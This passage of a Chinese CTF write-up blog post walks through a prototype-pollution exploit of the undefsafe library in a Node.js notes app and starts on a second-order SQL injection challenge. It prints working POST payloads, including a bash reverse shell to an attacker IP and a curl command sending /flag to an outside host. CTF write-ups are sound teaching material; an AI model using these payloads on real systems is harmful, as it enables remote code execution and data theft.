+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;rev1ve&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这时候toString属性就被我们修改了，那么根据上面的代码他会将commands对象所有的属性列出来，那么我们就可以利用原型链添加一个我们想要的属性值即可。</p>
+<p>能让我们足够自由传参数的污染的函数就是edit_note()</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>调用了该函数的位置就在&#x2F;edit_note路由</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure>
+
+<p>那我们只要控制id为__ proto __即可污染。</p>
+<p>这里一开始传了参数发现会报错给我整不会了</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173335763.png" alt="image-20240320173335763" class="lazyload"></p>
+<p>去看了wp说报错也不影响。</p>
+<p>那我就先试了一下污染成ls，但是没有回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=ls&amp;raw=hhh<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320173550096.png" alt="image-20240320173550096" class="lazyload"></p>
+<p>然后用了一下curl是能监听到的，那就可以直接反弹shell了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">id=__proto__&amp;author=bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&amp;raw=hhh<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>难绷弹不回来不知道为什么，那就用curl吧。。。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=curl &lt;主机ip&gt; -d `cat /flag`&amp;raw=hhh<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240320174451680.png" alt="image-20240320174451680" class="lazyload"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/135079967">https://blog.csdn.net/m0_73512445/article/details/135079967</a></p>
+<h1><span id="wang-ding-bei-2018-unfinish">[网鼎杯 2018]unfinish</span><a href="#wang-ding-bei-2018-unfinish" class="header-anchor">#</a></h1><p>这题的考点是二次注入，还不会二次注入先学习一下，参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p>
+<blockquote>
+<p>总结一下就是二次利用恶意数据，第一次发送的恶意数据经过转义后存入数据库，但之后从数据取出数据利用的时候并没有转义，那这个时候我们的恶意数据就会生效。</p>
+</blockquote>
+<p>进去就给了一个login.php，扫了一下发现还有register.php</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326000952219.png" alt="image-20240326000952219" class="lazyload"></p>
+<p>随便注册一个账号登录进去之后就是一张图片</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326001047845.png" alt="image-20240326001047845" class="lazyload"></p>
+<p>可以看到上图的左侧中会回显一个用户名，这就是第二次利用数据库中的数据，那应该就是在注册的用户名上动手脚了</p>
+<p>在注册页面的用户名输了一下逗号发现被过滤了</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326002729728.png" alt="image-20240326002729728" class="lazyload"></p>
+<p>那我们就先去爆破一下看看过滤了什么关键词</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326003157517.png" alt="image-20240326003157517" class="lazyload"></p>
+<p>看到似乎是只过滤了information和逗号</p>
+<p>参测一下sql语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select username from table where username = &#x27;传递的参数&#x27;<br></code></pre></td></tr></table></figure>
+
+
+	</article>
+
+	 
+    <div class="kira-post-copyright">
+        <strong>Author：</strong>clown<br>
+        <strong>Link：</strong><a href="https://clowsman.github.io/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/" title="https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;20&#x2F;Nssctf刷题-网鼎杯&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;20&#x2F;Nssctf刷题-网鼎杯&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+  
+	<div class="kira-post-nav">
+		<nav class="post-nav">
+			      
+			<!-- 先找到与当前文字相同的目录 -->
+			            
+			<!-- 在找到当前文章所在的 index -->
+			            
+			<!-- 上一篇文章 -->
+			<div class="old">
+				<span>上一章</span>
+				<a href="/2024/03/11/ctfhub%E7%9A%84disable-function/"> ctfhub的disable_function</a>
+			</div>
+			                                                      
+		</nav>
+	</div>
+	
+	<div class="kira-post-meta kira-rainbow">
+		
+			<a class="kirafont icon-container-fill -link" href="/categories/web/">web</a>
+		
+		
+			<a class="kirafont icon-tag-fill -none-link" href="/tags/ctf-%E5%88%B7%E9%A2%98/" rel="tag">ctf 刷题</a>
+		
+	</div>
+	
+		<script src="/js/kira-code-copy.js"></script>
+	
+	
+	<div class="kira-post-footer">
+		
+
+		
+	<div class="giscus"></div>
+  
+    <script src="https://giscus.app/client.js"
+      data-repo="ch1ny/ch1ny.github.io"
+      data-repo-id="R_kgDOHGgizw"
+      data-category="General"
+      data-category-id="DIC_kwDOHGgiz84CU88t"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="en"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async  
+    ></script>
+  
+
+	</div>
+	
+</div>
+
+				</div>
+			</div>
+			<div class="kira-right-column">
+	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
+		<button class="mdui-fab mdui-ripple">
+			<i class="kirafont icon-caret-up"></i>
+		</button>
+	</a>
+</div>
+
+		</div>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
